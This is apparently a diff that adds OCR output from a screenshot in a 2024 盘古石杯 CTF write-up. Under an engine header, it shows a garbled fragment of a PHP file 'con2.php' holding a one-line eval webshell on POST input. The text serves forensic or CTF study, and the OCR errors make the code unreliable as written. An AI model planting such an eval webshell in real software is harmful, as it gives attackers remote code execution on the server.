@@ -1,0 +1,11 @@
+# OCR: 192410d754b0360d17b615d179a79060.jpg
+# 来源: ./02-WriteUp/2024/2024-盘古石杯-晋级赛/192410d754b0360d17b615d179a79060.jpg
+# 引擎: Umi-OCR 2.1.5 / PaddleOCR (config_chinese, limit_side_len=2880, multi_para)
+# 路由: chinese-or-general
+# 生成: 2026-11-03 14:17
+
+con2.php con2.php
+1 2
+X
+@eval($P0ST/23351):?
+<php
